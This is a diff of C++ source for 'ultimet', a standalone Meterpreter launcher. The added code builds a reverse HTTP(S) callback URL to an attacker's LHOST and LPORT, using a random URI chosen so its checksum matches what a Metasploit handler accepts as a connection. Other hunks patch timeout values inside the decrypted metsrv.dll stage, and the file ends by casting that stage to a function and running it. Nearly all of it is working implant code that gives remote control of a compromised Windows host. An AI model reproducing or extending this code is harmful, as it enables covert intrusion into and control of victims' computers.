@@ -1,4 +1,14 @@
 //»”„ «··Â «·—Õ„‰ «·—ÕÌ„
+
+/************************************************
+ *					  [ultimet]					*
+ *		The Ultimate Meterpreter Executable		*
+ ************************************************		
+  - @SherifEldeeb
+  - http://eldeeb.net
+  - Made in Egypt :)
+ ************************************************/
+
 #include "main.h"
 
 int wmain(int argc, wchar_t *argv[])
@@ -6,10 +16,19 @@ int wmain(int argc, wchar_t *argv[])
 	PAYLOAD_SETTINGS payload_settings = {0}; //That's defined at main.h
 	BYTE* buffer = nullptr; // this will hold the stage 
 	DWORD bufferSize = 0;	// buffer length
-	DWORD index = 0;		// will be used to locate strings to be patched "reverse_tcp, reverse_http, the url ... etc."
+	DWORD index = 0;		// will be used to locate offset of stuff to be patched "reverse_tcp, reverse_http, the url ... etc."
 	char EncKey[16] = {0};	// XOR Encryption key
-	SOCKET ConnectSocket = INVALID_SOCKET; // Socket ... will be used for reverse_tcp
 	void (*function)();		// The casted-to-be-function after we have everything in place.
+	
+	/*
+	Reverse_TCP specific Variables
+	*/
+	SOCKET ConnectSocket = INVALID_SOCKET; // Socket ... will be used for reverse_tcp
+	
+	/*
+	HTTP(S) Specific Variables
+	*/
+	char url[512] = {0};	//Full URL 
 
 	/*
 	Program Start
@@ -130,7 +149,7 @@ int wmain(int argc, wchar_t *argv[])
 
 		//Patching global expiration timeout.
 		index = 0; //rewind
-		index = binstrstr(buffer, (int)bufferSize, (BYTE*)"\x61\xe6\x4b\xb6", 4); //int *global_expiration_timeout = 0xb64be661; Big endian, metsrv.dll 
+		index = binstrstr(buffer, (int)bufferSize, (BYTE*)"\x61\xe6\x4b\xb6", 4); //int *global_expiration_timeout = 0xb64be661; little endian, metsrv.dll 
 		if (index == 0) // if the global_expiration_timeout is not found ...
 		{
 			dprintf(L"[-] Couldn't locate global_expiration_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
@@ -147,7 +166,7 @@ int wmain(int argc, wchar_t *argv[])
 
 		//Patching global_comm_timeout.
 		index = 0; //rewind
-		index = binstrstr(buffer, (int)bufferSize, (BYTE*)"\x7f\x25\x79\xaf", 4); //int *global_comm_timeout = 0xaf79257f; Big endian, metsrv.dll 
+		index = binstrstr(buffer, (int)bufferSize, (BYTE*)"\x7f\x25\x79\xaf", 4); //int *global_comm_timeout = 0xaf79257f; little endian, metsrv.dll 
 		if (index == 0) // if the global_expiration_timeout is not found ...
 		{
 			dprintf(L"[-] Couldn't locate global_comm_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
@@ -181,10 +200,56 @@ int wmain(int argc, wchar_t *argv[])
 		memcpy(buffer+1, &ConnectSocket, 4);
 		dprintf(L"[*] Everything in place, casting whole buffer as a function...\n");
 	} 
-	// Are we reverse_http(s)?
-	else if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTP") == 0)
-	{
 
+	// Are we reverse_http(s)?
+	else if((wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTP") == 0) || (wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTPS") == 0))
+	{
+		/*
+		Building the URL
+		*/
+		int checksum = 0;			//Calculated Checksum placeholder. 
+		char URI_Part_1[4] = {0};	//4 chars ... it can be any length actually.
+		char URI_Part_2[16] = {0};	//16 random chars.
+		srand ( time(NULL) );	//Seed rand() 
+
+		while(true)				//Keep getting random values till we succeed
+		{
+			gen_random(URI_Part_1, 4);				//Generate a 4 char long random string ... it could be any length actually, but 4 sounded just fine.
+			checksum = TextChecksum8(URI_Part_1);	//Get the 8-bit checksum of the random value
+			if(checksum == URI_CHECKSUM_CONN)		//If the checksum == 98, it will be handled by the multi/handler correctly as a "CONN_" request and short fused into a session.
+			{
+				break; // We found a random string that checksums to 98
+			}
+		}
+		gen_random(URI_Part_2, 16);	//get second part, random 16 chars
+
+		//Let's build the complete uri, it should look like http(s)://LHOST:LPORT/CHECKSUM8(98)_XXXXXXXXXXXXXXXX/
+		//HTTP? HTTPS?
+		if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTP") == 0)
+			strcat_s(url, "http://");
+		else
+			strcat_s(url, "https://");
+
+		//The joys of converting between wchar_t and char ...
+		char tempChar1[512] = {0}; //This is used for converting from wchar_t to char... 
+		char tempChar2[512] = {0}; //This is used for converting from wchar_t to char... 
+
+		wcstombs_s(NULL,tempChar1,payload_settings.LHOST, wcslen(payload_settings.LHOST)); //convert the LHOST to char
+		wcstombs_s(NULL,tempChar2,payload_settings.LPORT, wcslen(payload_settings.LHOST)); //convert the LPORT to char
+
+		//wide-char conversion happiness ends here... building the url...
+		strcat_s(url,tempChar1);	// "http(s)://LHOST"
+		strcat_s(url,":");			// "http(s)://LHOST:"
+		strcat_s(url,tempChar2);	// "http(s)://LHOST:LPORT"
+		strcat_s(url,"/");			// "http(s)://LHOST:LPORT/"
+		strcat_s(url,URI_Part_1);	// "http(s)://LHOST:LPORT/CONN"
+		strcat_s(url,"_");			// "http(s)://LHOST:LPORT/CONN_"
+		strcat_s(url,URI_Part_2);	// "http(s)://LHOST:LPORT/CONN_XXXXXXXXXXXX"
+		strcat_s(url,"/\0");		// "http(s)://LHOST:LPORT/CONN_XXXXXXXXXXXX/"
+		//Thanks for waiting :)
+		wchar_t temp[512] = {0};
+		mbstowcs_s(NULL,temp,url,strlen(url));
+		dprintf(L"[*] URL: %s\n",temp);
 	}
 
 	function = (void (*)())buffer;
